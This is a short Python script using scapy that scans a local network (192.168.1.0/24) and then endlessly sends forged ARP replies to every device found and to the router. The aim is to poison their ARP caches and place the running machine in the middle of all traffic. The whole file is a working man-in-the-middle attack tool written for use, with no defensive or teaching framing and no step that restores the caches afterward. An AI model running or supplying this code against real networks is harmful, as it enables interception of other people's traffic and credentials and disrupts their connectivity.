#!/usr/bin/env python3

from time import sleep
import scapy.all as scapy


def scan(ip):
    arp_request = scapy.ARP()
    arp_request.pdst = ip
    ip_mac_address_list = {}
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=1, verbose=False)[0]

    for element in answered_list:
        ip_mac_address_list[element[1].psrc] = element[1].hwsrc

    return ip_mac_address_list


# Your network configuration
network_range = "192.168.1.0/24"  # This matches your Wi-Fi network
router_ip = "192.168.1.1"         # Your default gateway IP


def spoof(target_ip, target_mac, spoof_ip):
    # Get our own MAC address
    our_mac = scapy.get_if_hwaddr(scapy.conf.iface)

    # Create Ethernet frame
    ether = scapy.Ether(dst=target_mac, src=our_mac)
    
    # Create the ARP packet
    arp = scapy.ARP(
        op=2,                     # ARP Reply
        pdst=target_ip,          # Target IP
        hwdst=target_mac,        # Target MAC
        psrc=spoof_ip,           # Router IP (we're impersonating)
        hwsrc=our_mac            # Our MAC
    )

    # Combine and send the packet
    packet = ether/arp
    scapy.sendp(packet, verbose=False)


# Scan your network to get IP and MAC addresses
ips_to_macs = scan(network_range)

packets_count = 0
while 1:
    # Get router's MAC address
    router_mac = ips_to_macs.get(router_ip)

    # Spoof each device on the network
    for target_ip, target_mac in ips_to_macs.items():
        if target_ip != router_ip:  # Don't spoof the router
            # Spoof target device (tell target we are the router)
            spoof(target_ip, target_mac, router_ip)
            # Spoof router (tell router we are the target)
            spoof(router_ip, router_mac, target_ip)

    print(f"\r[+] packets sent: {packets_count}", end="")
    packets_count += 2
    sleep(2)
